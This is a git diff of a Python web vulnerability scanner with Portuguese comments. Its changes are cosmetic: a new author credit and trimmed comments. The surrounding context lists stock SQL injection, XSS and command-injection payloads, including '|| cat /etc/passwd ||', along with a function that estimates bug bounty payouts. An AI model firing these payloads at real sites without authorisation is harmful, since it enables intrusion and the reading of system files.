@@ -11,10 +11,10 @@ HEADER = """
 ██║   ██║██║     ██╔══██║██║   ██║    ╚════██║██║██║     ██╔══╝  ██║╚██╗██║   ██║   
 ╚██████╔╝███████╗██║  ██║╚██████╔╝    ███████║██║███████╗███████╗██║ ╚████║   ██║   
  ╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝     ╚══════╝╚═╝╚══════╝╚══════╝╚═╝  ╚═══╝   ╚═╝
-\033[0m
+by: vendetta the god\033[0m
 """
 
-# Lista de payloads de injeção SQL comuns
+# payloads de injeção SQL comuns
 sql_payloads = [
     "' OR '1'='1",
     "' OR '1'='1' -- ",
@@ -23,13 +23,13 @@ sql_payloads = [
     "' OR '1'='1' /*'",
 ]
 
-# Lista de payloads de XSS comuns
+# payloads de XSS comuns
 xss_payloads = [
     "<script>alert('XSS')</script>",
     "<img src=x onerror=alert('XSS')>",
 ]
 
-# Lista de payloads de RCE comuns
+# payloads de RCE comuns
 rce_payloads = [
     "|| ls ||",
     "|| cat /etc/passwd ||",
@@ -76,11 +76,11 @@ def estimate_bounty(vulnerabilities):
     bounty = 0
     for vuln in vulnerabilities:
         if "SQL Injection" in vuln:
-            bounty += 1500  # Estimativa para SQL Injection
+            bounty += 1500  
         elif "XSS" in vuln:
-            bounty += 500  # Estimativa para XSS
+            bounty += 500  
         elif "RCE" in vuln:
-            bounty += 3000  # Estimativa para RCE
+            bounty += 3000  
     return bounty
 
 def main():
